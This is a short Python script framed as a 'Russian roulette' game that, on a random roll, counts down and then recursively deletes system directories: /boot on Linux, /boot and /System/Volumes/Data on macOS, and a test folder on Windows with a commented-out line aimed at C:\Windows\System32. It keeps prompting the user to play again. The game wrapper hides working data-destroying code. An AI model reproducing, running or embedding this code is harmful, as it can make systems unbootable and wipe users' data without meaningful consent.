# import os
import random
import time
import platform
import shutil


def check_os():
    return platform.system()


def random_os_dead():

    if random.randint(0, 6) == 1:
        print("Bang!! XP")
        time.sleep(1)
        print(3)
        time.sleep(1)
        print(2)
        time.sleep(1)
        print(1)
        if check_os() == "Windows":
            try:
                shutil.rmtree("./test")
                #  shutil.rmtree('C:\Windows\System32')
            except Exception as e:
                print(':/ => ',e)  
                 
        elif check_os() == "Linux":
            try:
                shutil.rmtree("/boot") 
            except Exception as e:
                print(':/ => ',e) 
            
        elif check_os() == "Darwin":
            try:
                shutil.rmtree("/boot") 
            except Exception as e:
                print(':/ => ',e)  

            try:
                shutil.rmtree("/System/Volumes/Data")
            except Exception as e:
                print(':/ => ',e)  
           
    else:
        return print("Click! Oh you got luck!")


def main():
    random_os_dead()


if __name__ == "__main__":
    while input("Let's play Russian roulette :) \nEnter to start.") != "n":
        main()
